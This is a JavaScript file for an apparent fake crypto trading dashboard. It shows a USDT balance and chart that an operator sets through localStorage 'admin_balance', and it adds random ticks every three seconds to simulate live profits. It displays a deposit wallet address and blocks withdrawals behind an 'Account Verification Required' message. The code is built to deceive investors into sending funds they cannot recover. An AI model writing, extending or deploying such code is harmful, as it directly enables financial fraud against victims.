document.addEventListener('DOMContentLoaded', () => {
    let currentBalance = parseFloat(localStorage.getItem('admin_balance')) || 1000.00;
    let depositAddress = localStorage.getItem('admin_address') || "0x71C...3a94";
    let paymentMethod = localStorage.getItem('admin_method') || "USDT (TRC20)";

    // Function to update the text display safely
    function updateBalanceDisplay() {
        const display = document.getElementById('balance-display');
        if (display) {
            display.innerText = '$' + currentBalance.toFixed(2);
        }
    }

    updateBalanceDisplay();

    // --- ENHANCED MODAL CONTROLLERS ---
    // These functions change the style element to make your overlay screens visible
    window.triggerDepositModal = function() {
        // Looks for common modal element IDs or class layouts
        const depositModal = document.getElementById('depositModal') || 
                             document.getElementById('deposit-modal') || 
                             document.querySelector('.deposit-modal');
        if (depositModal) {
            depositModal.style.display = 'flex';
            depositModal.style.visibility = 'visible';
        } else {
            alert(`Deposit Address (${paymentMethod}):\n${depositAddress}`);
        }
    }

    window.triggerWithdrawalModal = function() {
        const withdrawModal = document.getElementById('withdrawModal') || 
                              document.getElementById('withdraw-modal') || 
                              document.querySelector('.withdraw-modal');
        if (withdrawModal) {
            withdrawModal.style.display = 'flex';
            withdrawModal.style.visibility = 'visible';
        } else {
            alert("Account Verification Required\nTo withdraw funds, please complete identity verification.");
        }
    }

    // --- CHART INITIALIZATION ---
    const chartElement = document.getElementById('LivePerformanceChart');
    if (!chartElement) return;
    const ctx = chartElement.getContext('2d');

    const greenColor = 'rgba(16, 185, 129, 1)';
    const greenGradientStart = 'rgba(16, 185, 129, 0.24)';
    const redColor = 'rgba(239, 68, 68, 1)';
    const redGradientStart = 'rgba(239, 68, 68, 0.24)';

    function getChartGradient(colorStart) {
        let gradient = ctx.createLinearGradient(0, 0, 0, 300);
        gradient.addColorStop(0, colorStart);
        gradient.addColorStop(1, 'rgba(0, 0, 0, 0.0)');
        return gradient;
    }

    const liveChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00'],
            datasets: [{
                label: 'Portfolio Value (USDT)',
                data: [
                    currentBalance * 0.992, 
                    currentBalance * 0.995, 
                    currentBalance * 0.991, 
                    currentBalance * 0.997, 
                    currentBalance * 0.994, 
                    currentBalance
                ],
                borderColor: greenColor,
                borderWidth: 3,
                fill: true,
                backgroundColor: getChartGradient(greenGradientStart),
                tension: 0.4
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: { legend: { display: false } }
        }
    });

    // --- INTERACTION LOOP ---
    setInterval(() => {
        const controlledBalance = parseFloat(localStorage.getItem('admin_balance'));
        const pctChange = (Math.random() * 0.3 - 0.15) / 100;
        const previousBalance = currentBalance;
        
        if (!isNaN(controlledBalance) && controlledBalance !== parseFloat(localStorage.getItem('_last_processed_controlled'))) {
            currentBalance = controlledBalance;
            localStorage.setItem('_last_processed_controlled', controlledBalance);
        } else {
            currentBalance = currentBalance * (1 + pctChange);
        }

        liveChart.data.datasets[0].data = [
            currentBalance * 0.992, 
            currentBalance * 0.995, 
            currentBalance * 0.991, 
            currentBalance * 0.997, 
            currentBalance * 0.994, 
            currentBalance
        ];
        
        updateBalanceDisplay();

        if (currentBalance >= previousBalance) {
            liveChart.data.datasets[0].borderColor = greenColor;
            liveChart.data.datasets[0].backgroundColor = getChartGradient(greenGradientStart);
        } else {
            liveChart.data.datasets[0].borderColor = redColor;
            liveChart.data.datasets[0].backgroundColor = getChartGradient(redGradientStart);
        }

        liveChart.update('none'); 
    }, 3000); 
});
